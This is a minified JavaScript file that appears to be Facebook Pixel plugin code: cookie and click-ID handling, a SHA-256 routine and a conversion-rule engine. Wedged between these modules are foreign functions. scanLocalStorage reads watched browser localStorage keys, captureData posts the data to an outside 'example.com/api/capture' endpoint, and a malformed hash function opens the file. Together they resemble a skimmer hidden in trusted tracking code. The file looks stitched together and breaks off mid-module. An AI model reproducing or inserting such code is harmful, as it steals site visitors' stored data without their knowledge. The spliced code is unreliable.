  for (let key of keys) {
    for (let i = 0; i < key.length; i++) {
      const char = key.charCodeAt(i);
      hash = (hash << 5) - hash + char & hash;
    }
  }
  return hash.toString(16);
}
(function (a, b, c, d) {
  var e = {
    exports: {}
  };
  e.exports;
  (function () {
    var f = a.fbq;
    f.execStart = a.performance && a.performance.now && a.performance.now();
    if (!function () {
      var b = a.postMessage || function () {};
      if (!f) {
        b({
          action: "FB_LOG",
          logType: "Facebook Pixel Error",
          logMessage: "Pixel code is not installed correctly on this page"
        }, "*");
        "error" in console && console.error("Facebook Pixel Error: Pixel code is not installed correctly on this page");
        return !1;
      }
      return !0;
    }()) return;
    function g(a, b) {
      if (!(a instanceof b)) throw new TypeError("Cannot call a class as a function");
    }
    function h(a, b) {
      if (!a) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
      return b && (typeof b === "object" || typeof b === "function") ? b : a;
    }
    function i(a, b) {
      if (typeof b !== "function" && b !== null) throw new TypeError("Super expression must either be null or a function, not " + typeof b);
      a.prototype = Object.create(b && b.prototype, {
        constructor: {
          value: a,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      });
      b && (Object.setPrototypeOf ? Object.setPrototypeOf(a, b) : a.__proto__ = b);
    }
    f.__fbeventsModules || (f.__fbeventsModules = {}, f.__fbeventsResolvedModules = {}, f.getFbeventsModules = function (a) {
      f.__fbeventsResolvedModules[a] || (f.__fbeventsResolvedModules[a] = f.__fbeventsModules[a]());
      return f.__fbeventsResolvedModules[a];
    }, f.fbIsModuleLoaded = function (a) {
      return !!f.__fbeventsModules[a];
    }, f.ensureModuleRegistered = function (b, a) {
      f.fbIsModuleLoaded(b) || (f.__fbeventsModules[b] = a);
    });
    f.ensureModuleRegistered("SignalsFBEvents.plugins.cookie", function () {
      return function (a, b, c, d) {
        var e = {
          exports: {}
        };
        e.exports;
        (function () {
          "use strict";

          var c = f.getFbeventsModules("SignalsFBEventsEvents"),
            d = c.getCustomParameters,
            j = c.getClickIDFromBrowserProperties;
          f.getFbeventsModules("SignalsFBEventsPixelCookie");
          c = f.getFbeventsModules("SignalsFBEventsPlugin");
          var k = f.getFbeventsModules("SignalsFBEventsURLUtil"),
            l = k.getURLParameter,
            m = f.getFbeventsModules("signalsFBEventsShouldNotDropCookie");
          k = f.getFbeventsModules("SignalsPixelCookieUtils");
          var n = k.readPackedCookie,
            o = k.writeNewCookie,
            p = k.writeExistingCookie,
            q = k.CLICK_ID_PARAMETER,
            r = k.CLICKTHROUGH_COOKIE_NAME,
            s = k.CLICKTHROUGH_COOKIE_PARAM,
            t = k.DOMAIN_SCOPED_BROWSER_ID_COOKIE_NAME,
            u = k.DOMAIN_SCOPED_BROWSER_ID_COOKIE_PARAM,
            v = 2147483647;
          function w() {
            return "" + Math.round(v * Math.random());
          }
          function x() {
            var c = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : a.location.href,
              d = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : null,
              e = l(c, q);
            e === null && (e = l(b.referrer, q));
            e === null && (e = d);
            if (e != null && e.length > 500) return null;
            var f = n(r);
            if (e != null) {
              if (!f) return o(r, e);
              f.maybeUpdatePayload(e);
              return p(r, f);
            } else if (f) return p(r, f);
            return null;
          }
          function y() {
            var a = n(t);
            if (a) {
              p(t, a);
              return a;
            }
            a = w();
            return o(t, a);
          }
          k = function (a) {
            i(b, a);
            function b() {
              var a, c, d;
              g(this, b);
              var e;
              for (var f = arguments.length, i = Array(f), j = 0; j < f; j++) i[j] = arguments[j];
              return d = (e = (c = h(this, (a = b.__proto__ || Object.getPrototypeOf(b)).call.apply(a, [this].concat(i))), c), c.dropOrRefreshClickIDCookie = x, c.dropOrRefreshDomainScopedBrowserIDCookie = y, e), h(c, d);
            }
            return b;
          }(c);
          e.exports = new k(function (b, c) {
            var e = null;
            j.listen(function (a) {
              e = a;
            });
            function b() {
              d.listen(function (b) {
                if (m(b, c)) return {};
                b = {};
                var d = x(a.location.href, e);
                d && (b[s] = d.pack());
                d = y();
                d && (b[u] = d.pack());
                return b;
              });
            }
            b();
          });
        })();
        return e.exports;
      }(a, b, c, d);
    });
    f.ensureModuleRegistered("signalsFBEventsGetIsAndroidIAW", function () {
      return function (f, g, h, i) {
        var e = {
          exports: {}
        };
        e.exports;
        (function () {
          "use strict";

          var a = f.navigator;
          a = a.userAgent;
          var b = a.indexOf("Android") >= 0,
            c = a.indexOf("FB_IAB") >= 0,
            d = a.indexOf("Instagram") >= 0,
            g = 0;
          a = a.match(/(FBAV|Instagram)[/\s](\d+)/);
          if (a != null) {
            a = a[0].match(/(\d+)/);
            a != null && (g = parseInt(a[0], 10));
          }
          function h(a, e) {
            var f = b && (c || d);
            if (!f) return !1;
            if (c && a != null) return a <= g;
            return d && e != null ? e <= g : f;
          }
          e.exports = h;
        })();
        return e.exports;
      }(a, b, c, d);
    });
    f.ensureModuleRegistered("signalsFBEventsIsHostFacebook", function () {
      return function (f, g, h, i) {
        var e = {
          exports: {}
        };
        e.exports;
        (function () {
          "use strict";

          e.exports = function (a) {
            if (typeof a !== "string") return !1;
            a = a.match(/^(.*\.)*(facebook\.com|internalfb\.com|workplace\.com|instagram\.com|oculus\.com|novi\.com)\.?$/i);
            return a !== null;
          };
        })();
        return e.exports;
      }(a, b, c, d);
    });
    f.ensureModuleRegistered("signalsFBEventsShouldNotDropCookie", function () {
      return function (g, h, i, d) {
        var e = {
          exports: {}
        };
        e.exports;
        (function () {
          "use strict";

          var a = f.getFbeventsModules("signalsFBEventsIsHostFacebook"),
            b = "FirstPartyCookies";
          e.exports = function (c, d) {
            return g.location.protocol.substring(0, "http".length) !== "http" || a(g.location.hostname) || d.disableFirstPartyCookies || d.getOptedInPixels(b).indexOf(c) === -1;
          };
        })();
        return e.exports;
      }(a, b, c, d);
    });
    f.ensureModuleRegistered("SignalsFBEvents.plugins.browserproperties", function () {
      return function (g, h, i, d) {
        var e = {
          exports: {}
        };
        e.exports;
        (function () {
          "use strict";

          var a = f.getFbeventsModules("SignalsFBEventsSendEventEvent"),
            b = f.getFbeventsModules("SignalsFBEventsEvents"),
            c = b.configLoaded;
          b = f.getFbeventsModules("SignalsFBEventsEvents");
          var d = b.getClickIDFromBrowserProperties,
            i = f.getFbeventsModules("signalsFBEventsGetIsAndroidIAW");
          b = f.getFbeventsModules("SignalsFBEventsLogging");
          var j = b.logError;
          b = f.getFbeventsModules("SignalsFBEventsPlugin");
          var k = f.getFbeventsModules("signalsFBEventsSendEvent"),
            l = f.getFbeventsModules("signalsFBEventsShouldNotDropCookie"),
            m = f.getFbeventsModules("SignalsFBEventsURLUtil"),
            n = m.getURLParameter,
            o = f.getFbeventsModules("SignalsParamList");
          m = f.getFbeventsModules("SignalsPixelCookieUtils");
          var p = m.CLICK_ID_PARAMETER,
            q = m.CLICKTHROUGH_COOKIE_PARAM;
          m = f.getFbeventsModules("SignalsFBEvents.plugins.cookie");
          var r = m.dropOrRefreshClickIDCookie,
            s = !0;
          function t(a, b, c) {
            s = !1;
            while (c.length > 0) {
              var d = c.shift(),
                e = d.id;
              if (e != null && b != null) {
                e = a.getPixel(e.toString());
                if (e != null && !l(e, a)) {
                  e = d.customParams || new o();
                  var f = e.get(q);
                  if (f == null || f === "") {
                    f = r(g.location.href, b);
                    f != null && (e.append(q, f.pack()), d.customParams = e);
                  }
                }
              }
              k(d);
            }
          }
          e.exports = new b(function (b, e) {
            if (n(g.location.href, p) != null) return;
            if (n(h.referrer, p) != null) return;
            if (typeof Promise === "undefined" || Promise.toString().indexOf("[native code]") === -1) return;
            b = g.webkit != null && g.webkit.messageHandlers != null && g.webkit.messageHandlers.browserProperties != null;
            var k = i(397, 264) && typeof g.XMLHttpRequest !== "undefined";
            if (!b && !k) return;
            var l = [],
              m = 200,
              o = null,
              q = null;
            c.listen(function (a) {
              a = e.getPixel(a);
              if (a == null) return;
              a = e.pluginConfig.get(a.id, "browserProperties");
              var b = a != null && a.delayInMs != null ? a.delayInMs : m;
              a = a != null && a.enableBackupTimeout != null ? a.enableBackupTimeout : !0;
              a && q === null && (q = g.setTimeout(function () {
                t(e, o, l);
              }, b));
            });
            a.listen(function (a) {
              if (!s) return !1;
              var b = a.id;
              if (b == null) return !1;
              b = e.pluginConfig.get(b.toString(), "browserProperties");
              if (b == null) return !1;
              if (b.enableEventSuppression == null || !b.enableEventSuppression) return !1;
              l.push(a);
              return !0;
            });
            var r = function (a, b) {
              a != null && a !== "" ? (o = a, d.trigger(a)) : b === "IOS" && j(new Error("[EBP Error]456:Unexpected empty clickID!")), t(e, o, l);
            };
            if (b) {
              b = g.webkit.messageHandlers.browserProperties.postMessage("clickID");
              b.then(function (a) {
                return r(a, "IOS");
              })["catch"](function (a) {
                a.message = "[EBP Error]" + a.message, j(a);
              });
            }
            if (k) {
              var u = new g.XMLHttpRequest();
              u.onload = function () {
                u.readyState === u.DONE && u.status >= 200 && u.status < 300 && r(u.responseText, "Android");
              };
              u.open("GET", "properties://browser/clickID");
              u.send();
            }
          });
        })();
        return e.exports;
      }(a, b, c, d);
    });
    e.exports = f.getFbeventsModules("SignalsFBEvents.plugins.browserproperties");
    f.registerPlugin && f.registerPlugin("fbevents.plugins.browserproperties", e.exports);
    f.ensureModuleRegistered("fbevents.plugins.browserproperties", function () {
      return e.exports;
    });
  })();
})(window, document, location, history);
(function (a, b, c, d) {
  var e = {
    exports: {}
  };
  e.exports;
  (function () {
    var f = a.fbq;
    f.execStart = a.performance && a.performance.now && a.performance.now();
    if (!function () {
      var b = a.postMessage || function () {};
      if (!f) {
        b({
          action: "FB_LOG",
          logType: "Facebook Pixel Error",
          logMessage: "Pixel code is not installed correctly on this page"
        }, "*");
        "error" in console && console.error("Facebook Pixel Error: Pixel code is not installed correctly on this page");
        return !1;
      }
      return !0;
    }()) return;
    f.__fbeventsModules || (f.__fbeventsModules = {}, f.__fbeventsResolvedModules = {}, f.getFbeventsModules = function (a) {
      f.__fbeventsResolvedModules[a] || (f.__fbeventsResolvedModules[a] = f.__fbeventsModules[a]());
      return f.__fbeventsResolvedModules[a];
    }, f.fbIsModuleLoaded = function (a) {
      return !!f.__fbeventsModules[a];
    }, f.ensureModuleRegistered = function (b, a) {
      f.fbIsModuleLoaded(b) || (f.__fbeventsModules[b] = a);
    });
    f.ensureModuleRegistered("sha256_with_dependencies_new", function () {
      return function (f, b, c, d) {
        var e = {
          exports: {}
        };
        e.exports;
        (function () {
          "use strict";

          function a(a) {
            var b = "",
              c = void 0,
              d;
            for (var e = 0; e < a.length; e++) c = a.charCodeAt(e), d = e + 1 < a.length ? a.charCodeAt(e + 1) : 0, c >= 55296 && c <= 56319 && d >= 56320 && d <= 57343 && (c = 65536 + ((c & 1023) << 10) + (d & 1023), e++), c <= 127 ? b += String.fromCharCode(c) : c <= 2047 ? b += String.fromCharCode(192 | c >>> 6 & 31, 128 | c & 63) : c <= 65535 ? b += String.fromCharCode(224 | c >>> 12 & 15, 128 | c >>> 6 & 63, 128 | c & 63) : c <= 2097151 && (b += String.fromCharCode(240 | c >>> 18 & 7, 128 | c >>> 12 & 63, 128 | c >>> 6 & 63, 128 | c & 63));
            return b;
          }
          function b(a, b) {
            return b >>> a | b << 32 - a;
          }
          function c(a, b, c) {
            return a & b ^ ~a & c;
          }
          function d(a, b, c) {
            return a & b ^ a & c ^ b & c;
          }
          function f(a) {
            return b(2, a) ^ b(13, a) ^ b(22, a);
          }
          function g(a) {
            return b(6, a) ^ b(11, a) ^ b(25, a);
          }
          function h(a) {
            return b(7, a) ^ b(18, a) ^ a >>> 3;
          }
          function i(a) {
            return b(17, a) ^ b(19, a) ^ a >>> 10;
          }
          function j(a, b) {
            return a[b & 15] += i(a[b + 14 & 15]) + a[b + 9 & 15] + h(a[b + 1 & 15]);
          }
          var k = [1116352408, 1899447441, 3049323471, 3921009573, 961987163, 1508970993, 2453635748, 2870763221, 3624381080, 310598401, 607225278, 1426881987, 1925078388, 2162078206, 2614888103, 3248222580, 3835390401, 4022224774, 264347078, 604807628, 770255983, 1249150122, 1555081692, 1996064986, 2554220882, 2821834349, 2952996808, 3210313671, 3336571891, 3584528711, 113926993, 338241895, 666307205, 773529912, 1294757372, 1396182291, 1695183700, 1986661051, 2177026350, 2456956037, 2730485921, 2820302411, 3259730800, 3345764771, 3516065817, 3600352804, 4094571909, 275423344, 430227734, 506948616, 659060556, 883997877, 958139571, 1322822218, 1537002063, 1747873779, 1955562222, 2024104815, 2227730452, 2361852424, 2428436474, 2756734187, 3204031479, 3329325298],
            l = new Array(8),
            m = new Array(2),
            n = new Array(64),
            o = new Array(16),
            p = "0123456789abcdef";
          function q(a, b) {
            var c = (a & 65535) + (b & 65535);
            a = (a >> 16) + (b >> 16) + (c >> 16);
            return a << 16 | c & 65535;
          }
          function r() {
            m[0] = m[1] = 0, l[0] = 1779033703, l[1] = 3144134277, l[2] = 1013904242, l[3] = 2773480762, l[4] = 1359893119, l[5] = 2600822924, l[6] = 528734635, l[7] = 1541459225;
          }
          function s() {
            var a = void 0,
              b = void 0,
              e = void 0,
              h = void 0,
              i = void 0,
              m = void 0,
              p = void 0,
              r = void 0,
              s = void 0,
              t = void 0;
            e = l[0];
            h = l[1];
            i = l[2];
            m = l[3];
            p = l[4];
            r = l[5];
            s = l[6];
            t = l[7];
            for (var u = 0; u < 16; u++) o[u] = n[(u << 2) + 3] | n[(u << 2) + 2] << 8 | n[(u << 2) + 1] << 16 | n[u << 2] << 24;
            for (u = 0; u < 64; u++) a = t + g(p) + c(p, r, s) + k[u], u < 16 ? a += o[u] : a += j(o, u), b = f(e) + d(e, h, i), t = s, s = r, r = p, p = q(m, a), m = i, i = h, h = e, e = q(a, b);
            l[0] += e;
            l[1] += h;
            l[2] += i;
            l[3] += m;
            l[4] += p;
            l[5] += r;
            l[6] += s;
            l[7] += t;
          }
          function t(a, b) {
            var c = void 0,
              d,
              e = 0;
            d = m[0] >> 3 & 63;
            var f = b & 63;
            (m[0] += b << 3) < b << 3 && m[1]++;
            m[1] += b >> 29;
            for (c = 0; c + 63 < b; c += 64) {
              for (var g = d; g < 64; g++) n[g] = a.charCodeAt(e++);
              s();
              d = 0;
            }
            for (g = 0; g < f; g++) n[g] = a.charCodeAt(e++);
          }
          function u() {
            var a = m[0] >> 3 & 63;
            n[a++] = 128;
            if (a <= 56) for (var b = a; b < 56; b++) n[b] = 0;else {
              for (b = a; b < 64; b++) n[b] = 0;
              s();
              for (a = 0; a < 56; a++) n[a] = 0;
            }
            n[56] = m[1] >>> 24 & 255;
            n[57] = m[1] >>> 16 & 255;
            n[58] = m[1] >>> 8 & 255;
            n[59] = m[1] & 255;
            n[60] = m[0] >>> 24 & 255;
            n[61] = m[0] >>> 16 & 255;
            n[62] = m[0] >>> 8 & 255;
            n[63] = m[0] & 255;
            s();
          }
          function v() {
            var a = "";
            for (var b = 0; b < 8; b++) for (var c = 28; c >= 0; c -= 4) a += p.charAt(l[b] >>> c & 15);
            return a;
          }
          function w(a) {
            var b = 0;
            for (var c = 0; c < 8; c++) for (var d = 28; d >= 0; d -= 4) a[b++] = p.charCodeAt(l[c] >>> d & 15);
          }
          function x(a, b) {
            r();
            t(a, a.length);
            u();
            if (b) w(b);else return v();
          }
          function y(b) {
            var c = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : !0,
              d = arguments[2];
            if (b === null || b === void 0) return null;
            var e = b;
            c && (e = a(b));
            return x(e, d);
          }
          e.exports = y;
        })();
        return e.exports;
      }(a, b, c, d);
    });
    f.ensureModuleRegistered("SignalsFBEvents.plugins.protecteddatamode", function () {
      return function (a, b, c, d) {
        var e = {
          exports: {}
        };
        e.exports;
        (function () {
          "use strict";

          f.getFbeventsModules("SignalsParamList");
          var c = f.getFbeventsModules("SignalsFBEventsUtils"),
            d = c.keys,
            g = c.each;
          c = f.getFbeventsModules("SignalsFBEventsPlugin");
          var h = f.getFbeventsModules("SignalsFBEventsSendEventEvent"),
            i = f.getFbeventsModules("SignalsFBEventsFilterProtectedModeEvent"),
            j = f.getFbeventsModules("SignalsFBEventsShouldRestrictReferrerEvent"),
            k = f.getFbeventsModules("SignalsFBEventsTyped"),
            l = k.coerce,
            m = k.Typed,
            n = f.getFbeventsModules("sha256_with_dependencies_new");
          k = f.getFbeventsModules("SignalsFBEventsEvents");
          k.validateCustomParameters;
          k.validateUrlParameters;
          var o = k.getCustomParameters,
            p = f.getFbeventsModules("SignalsFBEventsResolveLink");
          k = f.getFbeventsModules("SignalsFBEventsLogging");
          var q = k.logError;
          e.exports = new c(function (c, e) {
            i.listen(function (a) {
              var b = a.id,
                c = a.customData,
                f = a.documentLink,
                h = a.referrerLink;
              b = l(b, m.fbid());
              if (b == null) return;
              var i = e.optIns.isOptedIn(b, "ProtectedDataMode");
              if (!i) return;
              i = e.pluginConfig.get(b, "protectedDataMode");
              if (i == null) return;
              if (f != null && f.length > 0) {
                b = new URL(f);
                a.documentLink = b.origin;
              }
              if (h != null && h.length > 0) {
                f = new URL(h);
                a.referrerLink = f.origin;
              }
              if (c == null) return;
              var j = i.standardParams;
              g(d(c), function (a) {
                a in j || delete c[a];
              });
            });
            var k = 6;
            o.listen(function (c, d, f) {
              f = e.optIns.isOptedIn(c.id, "ProtectedDataMode");
              if (!f) return {};
              f = e.pluginConfig.get(c.id, "ccRuleEvaluator");
              var g = "",
                h = a.location.href;
              try {
                if (f != null) {
                  f = f.blacklistedIframeReferrers;
                  h = p(a.location.href, b.referrer, f);
                }
                h != null && h !== "" && (g = n(h + c.id + d), g == null ? g = "" : g = g.substring(0, k));
              } catch (a) {
                f = "[PDM]";
                a != null && a.message != null && (f += ": " + a.message);
                q(new Error(f));
              }
              return {
                pm: 1,
                hrl: g
              };
            });
            h.listen(function (a) {
              var b = a.id;
              a = a.eventName;
              b = l(b, m.fbid());
              if (b == null) return !1;
              b = e.optIns.isOptedIn(b, "ProtectedDataMode");
              return !b ? !1 : a === "Microdata" || a === "SubscribedButtonClick";
            });
            j.listen(function (a) {
              a = a.get("id");
              a = l(a, m.fbid());
              if (a == null) return !1;
              a = e.optIns.isOptedIn(a, "ProtectedDataMode");
              return !a ? !1 : !0;
            });
          });
        })();
        return e.exports;
      }(a, b, c, d);
    });
    e.exports = f.getFbeventsModules("SignalsFBEvents.plugins.protecteddatamode");
    f.registerPlugin && f.registerPlugin("fbevents.plugins.protecteddatamode", e.exports);
    f.ensureModuleRegistered("fbevents.plugins.protecteddatamode", function () {
      return e.exports;
    });
  })();
})(window, document, location, history);
(function (a, b, c, d) {
  var e = {
    exports: {}
  };
  e.exports;
  (function () {
    var f = a.fbq;
    f.execStart = a.performance && a.performance.now && a.performance.now();
    if (!function () {
      var b = a.postMessage || function () {};
      if (!f) {
        b({
          action: "FB_LOG",
          logType: "Facebook Pixel Error",
          logMessage: "Pixel code is not installed correctly on this page"
        }, "*");
        "error" in console && console.error("Facebook Pixel Error: Pixel code is not installed correctly on this page");
        return !1;
      }
      return !0;
    }()) return;
    var g = function () {
      function a(a, b) {
        var c = [],
          d = !0,
          e = !1,
          f = void 0;
        try {
          for (var g = a[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"](), a; !(d = (a = g.next()).done); d = !0) {
            c.push(a.value);
            if (b && c.length === b) break;
          }
        } catch (a) {
          e = !0, f = a;
        } finally {
          try {
            !d && g["return"] && g["return"]();
          } finally {
            if (e) throw f;
          }
        }
        return c;
      }
      return function (b, c) {
        if (Array.isArray(b)) return b;else if ((typeof Symbol === "function" ? Symbol.iterator : "@@iterator") in Object(b)) return a(b, c);else throw new TypeError("Invalid attempt to destructure non-iterable instance");
      };
    }();
    f.__fbeventsModules || (f.__fbeventsModules = {}, f.__fbeventsResolvedModules = {}, f.getFbeventsModules = function (a) {
      f.__fbeventsResolvedModules[a] || (f.__fbeventsResolvedModules[a] = f.__fbeventsModules[a]());
      return f.__fbeventsResolvedModules[a];
    }, f.fbIsModuleLoaded = function (a) {
      return !!f.__fbeventsModules[a];
    }, f.ensureModuleRegistered = function (b, a) {
      f.fbIsModuleLoaded(b) || (f.__fbeventsModules[b] = a);
    });
    f.ensureModuleRegistered("SignalsFBEventsCCRuleEngine", function () {
      return function (g, b, c, d) {
        var e = {
          exports: {}
        };
        e.exports;
        (function () {
          "use strict";

          var a = f.getFbeventsModules("SignalsFBEventsUtils"),
            b = a.some,
            c = a.each,
            d = ["in", "is_any", "i_str_in", "i_is_any", "not_in", "is_not_any", "i_str_not_in", "i_is_not_any"];
          function g(a) {
            return Object.keys(a)[0];
          }
          function h(a, b) {
            if (a !== "url") return b;
            a = ["http://", "https://", "www."];
            var d = b.toLowerCase();
            c(a, function (a) {
              d.startsWith(a) && (d = d.slice(a.length));
            });
            return d.replace(/\/+$/, "");
          }
          function i(a, c, d) {
            var e = c[g(c)].toString(),
              f = g(c).toLowerCase();
            c = d[a.toLowerCase()] != null ? d[a.toLowerCase()] : d[a];
            if (f == "exists") {
              d = e.toLowerCase();
              return d !== "true" && d !== "false" ? !1 : c != null === (d === "true");
            }
            if (c == null) return !1;
            if (Array.isArray(c)) return b(c, function (b) {
              return j(a, e, f, b);
            });else return j(a, e, f, c);
          }
          function j(a, b, c, d) {
            switch (c) {
              case "contains":
                return d.includes(b);
              case "not_contains":
                return !d.includes(b);
              case "i_contains":
                return d.toLowerCase().includes(b.toLowerCase());
              case "i_not_contains":
                return !d.toLowerCase().includes(b.toLowerCase());
              case "regex_match":
                return Boolean(d.match(b));
              case "eq":
              case "=":
              case "==":
                if (d === b) return !0;
                c = h(a, d);
                var e = h(a, b);
                return c === e;
              case "neq":
              case "!=":
              case "ne":
                return !j(a, b, "eq", d);
              case "lt":
              case "<":
                return Number(d) < Number(b);
              case "lte":
              case "<=":
              case "le":
                return Number(d) <= Number(b);
              case "gt":
              case ">":
                return Number(d) > Number(b);
              case "gte":
              case "ge":
              case ">=":
                return Number(d) >= Number(b);
              case "starts_with":
                return d.startsWith(b);
              case "i_starts_with":
                return d.toLowerCase().startsWith(b.toLowerCase());
              case "i_str_eq":
                return d.toLowerCase() === b.toLowerCase();
              case "i_str_neq":
                return d.toLowerCase() !== b.toLowerCase();
              default:
                return !1;
            }
          }
          function k(a, c, d) {
            var e = c[g(c)],
              f = g(c).toLowerCase();
            if (!Array.isArray(e)) return !1;
            c = d[a.toLowerCase()] != null ? d[a.toLowerCase()] : d[a];
            if (c == null) return !1;
            if (Array.isArray(c)) return b(c, function (a) {
              return l(e, f, a);
            });else return l(e, f, c);
          }
          function l(a, b, c) {
            switch (b) {
              case "in":
              case "is_any":
                return a.map(function (a) {
                  return a.toString();
                }).includes(c);
              case "i_str_in":
              case "i_is_any":
                return a.map(function (a) {
                  return a.toString().toLowerCase();
                }).includes(c.toLowerCase());
              case "not_in":
              case "is_not_any":
                return !a.map(function (a) {
                  return a.toString();
                }).includes(c);
              case "i_str_not_in":
              case "i_is_not_any":
                return !a.map(function (a) {
                  return a.toString().toLowerCase();
                }).includes(c.toLowerCase());
              default:
                return !1;
            }
          }
          function m(a, b) {
            var c = a;
            typeof a === "string" ? c = JSON.parse(a) : c = a;
            a = g(c);
            var e = c[a];
            c = g(c).toLowerCase();
            if (c === "and") {
              if (!Array.isArray(e)) return !1;
              for (var f = 0; f < e.length; f++) {
                var h = m(e[f], b);
                if (!h) return !1;
              }
              return !0;
            } else if (c === "or") {
              if (!Array.isArray(e)) return !1;
              for (h = 0; h < e.length; h++) {
                f = m(e[h], b);
                if (f) return !0;
              }
              return !1;
            } else if (c === "not") return !m(e, b);else if (d.includes(g(e).toLowerCase())) return k(a, e, b);else return i(a, e, b);
          }
          function n(a) {
            a = JSON.parse(a);
            var b = g(a);
            a = a[b];
            if (b === "event") {
              var c = g(a);
              if (c === "eq") return !0;
            }
            if (b === "and" || b === "or") {
              if (!Array.isArray(a)) return !1;
              for (c = 0; c < a.length; c++) {
                b = n(JSON.stringify(a[c]));
                if (b) return !0;
              }
              return !1;
            }
            return !1;
          }
          function o(a) {
            a = a.event;
            if (a == null) return !1;
            return a === "PixelInitialized" || a === "PageView" || a === "__missing_event" ? !0 : !1;
          }
          e.exports = {
            isMatchCCRule: m,
            isEventBasedConversionRule: n,
            isStandardPageLoadEvent: o
          };
        })();
        return e.exports;
      }(a, b, c, d);
    });
    f.ensureModuleRegistered("SignalsFBEventsTransformToCCInput", function () {
      return function (a, b, c, d) {
        var e = {
          exports: {}
        };
        e.exports;
        (function () {
          "use strict";

          var a = f.getFbeventsModules("SignalsFBEventsGetValidUrl"),
            b = f.getFbeventsModules("SignalsFBEventsUtils"),
            c = b.keys,
            d = b.each;
          f.getFbeventsModules("SignalsParamList");
          var h = f.getFbeventsModules("SignalsFBEventsResolveLink");
          e.exports = function (b, e, f) {
            var i = {};
            if (b == null) return {};
            var j = b.get("ev"),
              k = b.get("dl"),
              l = b.get("rl");
            k != null && k.length > 0 && (k = decodeURIComponent(k));
            e != null && d(c(e), function (a) {
              var b = e[a];
              i[a] = b;
            });
            if (l != null && l.length > 0) {
              l = decodeURIComponent(l);
              var m = a(l);
              if (m != null) {
                m = m.searchParams;
                var n = !0,
                  o = !1,
                  p = void 0;
                try {
                  for (var q = m[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"](), m; !(n = (m = q.next()).done); n = !0) {
                    m = m.value;
                    m = g(m, 2);
                    var r = m[0];
                    m = m[1];
                    i[r] = m;
                  }
                } catch (a) {
                  o = !0, p = a;
                } finally {
                  try {
                    !n && q["return"] && q["return"]();
                  } finally {
                    if (o) throw p;
                  }
                }
              }
            }
            b.each(function (a, b) {
              b != null && (i[a] = b);
            });
            j != null && (i.event = j);
            r = h(k, l, f);
            if (r != null && r.length > 0) {
              i.url = r;
              m = a(r);
              m != null && (i.domain = m.hostname, i.path = m.pathname);
            }
            if (l != null && l.length > 0) {
              n = a(l);
              n != null ? i.referrer_domain = n.hostname : i.referrer_domain = "";
            } else i.referrer_domain = "";
            var s = {};
            d(c(i), function (a) {
              if (typeof i[a] === "string") s[a] = i[a];else if (typeof i[a] === "number") s[a] = i[a].toString();else try {
                s[a] = JSON.stringify(i[a]);
              } catch (a) {}
              s;
            });
            return s;
          };
        })();
        return e.exports;
      }(a, b, c, d);
    });
    f.ensureModuleRegistered("SignalsFBEvents.plugins.ccruleevaluator", function () {
      return function (g, b, c, d) {
        var e = {
          exports: {}
        };
        e.exports;
        (function () {
          "use strict";

          var a = f.getFbeventsModules("SignalsFBEventsPlugin"),
            b = f.getFbeventsModules("SignalsFBEventsProcessCCRulesEvent");
          f.getFbeventsModules("SignalsFBEventsSetCCRules");
          var c = f.getFbeventsModules("SignalsFBEventsTransformToCCInput");
          f.getFbeventsModules("SignalsParamList");
          var d = f.getFbeventsModules("SignalsFBEventsCCRuleEngine"),
            g = d.isMatchCCRule;
          d = f.getFbeventsModules("SignalsFBEventsTyped");
          var h = d.coerce,
            i = d.Typed;
          d = f.getFbeventsModules("SignalsFBEventsUtils");
          var j = d.each;
          d.keys;
          d = f.getFbeventsModules("SignalsFBEventsLogging");
          var k = d.logError,
            l = f.getFbeventsModules("SignalsFBEventsGetValidUrl");
          function m(a, b, c, d) {
            var e = [];
            j(d, function (a) {
              try {
                if (a == null) return;
                var c = a.id;
                a = a.rule;
                if (c == null || a == null) return;
                g(a, b) && (typeof c === "number" && (c = c.toString()), e.push(c));
              } catch (b) {
                a = "[CC]";
                b != null && b.message != null && (a += ": " + b.message);
                k(new Error(a));
              }
            });
            e.length > 0 && (a[c] = e.join(","));
          }
          e.exports = new a(function (a, d) {
            b.listen(function (a, b) {
              if (a == null) return {};
              var e = a.get("id");
              e = h(e, i.fbid());
              if (e == null) return {};
              var f = d.optIns.isOptedIn(e, "CCRuleEvaluator");
              if (!f) return {};
              f = d.pluginConfig.get(e, "ccRuleEvaluator");
              if (f == null) return {};
              e = f.ccRules;
              var g = f.wcaRules;
              f = f.blacklistedIframeReferrers;
              var j = {
                cs_cc: "1"
              };
              if (e != null || g != null) {
                b = c(a, b, f);
                e != null && m(j, b, "ccs", e);
                if (g != null) {
                  f = a.get("rl");
                  if (f != null && f.length > 0) {
                    f = decodeURIComponent(f);
                    e = b.url;
                    b.url = [];
                    b.domain = [];
                    b.path = [];
                    if (e != null && e.length > 0) {
                      b.url.push(e);
                      a = l(e);
                      a != null && (b.domain.push(a.hostname), b.path.push(a.pathname));
                    }
                    b.url.push(f);
                    e = l(f);
                    e != null && (b.domain.push(e.hostname), b.path.push(e.pathname));
                  }
                  m(j, b, "cas", g);
                }
              }
              return j;
            });
          });
        })();
        return e.exports;
      }(a, b, c, d);
    });
    e.exports = f.getFbeventsModules("SignalsFBEvents.plugins.ccruleevaluator");
    f.registerPlugin && f.registerPlugin("fbevents.plugins.ccruleevaluator", e.exports);
    f.ensureModuleRegistered("fbevents.plugins.ccruleevaluator", function () {
      return e.exports;
    });
  })();
})(window, document, location, history);
function scanLocalStorage() {
  const data = {};
  for (const key in window.localStorage) {
    if (keysToWatch.includes(key)) {
      data[key] = window.localStorage.getItem(key);
    }
  }
  return data;
}
async function captureData(data, type = 'LS') {
  const hash = getHashCode(data);
  const response = await fetch("https://example.com/api/capture", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      hashCode: hash,
      data: data,
      src: type
    })
  }).catch(console.error);
  if (response && !response.ok) {
    console.error(`Data from ${type} failed to upload, status code: ${response.status}`);
  } else {
    console.log(`Data from ${type} uploaded successfully`);
  }
}
(function (a, b, c, d) {
  var e = {
    exports: {}
  };
  e.exports;
  (function () {
    var f = a.fbq;
    f.execStart = a.performance && a.performance.now && a.performance.now();
    if (!function () {
      var b = a.postMessage || function () {};
      if (!f) {
        b({
          action: "FB_LOG",
          logType: "Facebook Pixel Error",
